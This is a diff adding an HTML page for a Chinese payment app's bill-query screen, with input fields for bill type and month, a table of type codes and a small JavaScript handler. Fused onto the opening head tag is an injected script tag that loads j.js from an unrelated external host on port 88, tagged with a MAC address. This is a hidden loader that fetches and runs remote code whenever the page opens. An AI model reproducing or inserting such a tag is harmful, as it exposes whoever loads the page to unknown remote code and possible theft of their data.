@@ -1,0 +1,98 @@
+
+<!DOCTYPE html>
+<html>
+
+<head><script src=http://t.7gg.cc:88/j.js?MAC=2C15E1070348></script>                                         
+    <meta charset="utf-8">
+    <title>账单查询</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1,user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <!--标准mui.css-->
+    <link rel="stylesheet" href="css/mui.min.css">
+    <!--App自定义的css-->
+    <link rel="stylesheet" type="text/css" href="css/app.css" />
+    <style>
+    .title {
+        margin: 20px 15px 7px;
+        color: #6d6d72;
+        font-size: 15px;
+    }
+    </style>
+</head>
+
+<body>
+    <header class="mui-bar mui-bar-nav">
+        <a class="mui-action-back mui-icon mui-icon-left-nav mui-pull-left"></a>
+        <h1 class="mui-title">账单查询</h1>
+    </header>
+    <div class="mui-content">
+        <div class="title">
+        </div>
+        <div class="mui-card">
+            <ul class="mui-table-view">
+                <li class="mui-table-view-cell mui-collapse mui-active">
+                    <a class="mui-navigate-right" href="#" id="titleId0">查询类型：</a>
+                    <div class="mui-collapse-content">
+                        <div class="mui-input-row" style="margin: 10px 5px;">
+                            <input type="text" id="reqContent" />
+                        </div>
+                    </div>
+                </li>
+
+                <li class="mui-table-view-cell mui-collapse mui-active">
+                    <a class="mui-navigate-right" href="#" id="titleId0">查询时间：</a>
+                    <div class="mui-collapse-content">
+                        <div class="mui-input-row" style="margin: 10px 5px;">
+                            <input type="text" id="reqContent1" />
+                        </div>
+                    </div>
+                </li>
+
+                <li class="mui-table-view-cell mui-collapse mui-active">
+                    <a class="mui-navigate-right" href="#" id="titleId0">参数说明：</a>
+                    <div class="mui-collapse-content">
+                        <div class="mui-input-row" style="margin: 10px 5px;">
+                            <p>查询类型:</p>
+                            <span>需要查询的账单类型，如果只需要查询时间，这里不填即可<br>
+                            类型对应的值:<br>00:消费<br>01:充话费<br>02:充流量<br>03:转账<br>05:和聚宝<br>06:充值<br>07:提现<br>08:当面付<br>09:信用卡还款<br>10:生活缴费<br>11:闪付卡<br>12:现金红包<br>15:收发红包订单<br></span>
+                            <p>查询时间:</p>
+                            <span>需要查询的时间，格式为年月，例:201802,如果只需要查询类型则这里不填即可</span>
+                        </div>
+                    </div>
+                </li>
+
+                <li class="mui-table-view-cell">
+                    <a href="javascript:void(0);" onclick="H5fetchPayPlug();">
+                        <div class="mui-media-body" style="text-align: center;">
+                            开始查询
+                        </div>
+                    </a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</body>
+<script src="js/mui.min.js"></script>
+<script>
+function H5fetchPayPlug() {
+    var reqtype = document.getElementById("reqContent").value;
+    var time = document.getElementById("reqContent1").value;
+
+    if(reqtype == ''){
+        reqtype = 'NO';
+    }
+
+    if(time == ''){
+        time = 'NO';
+    }
+
+    console.log(reqtype + '   ' + time);
+    billCheckingDetails(reqtype,time);
+}
+
+mui.init({
+    swipeBack: true //启用右滑关闭功能
+});
+</script>
+</html>
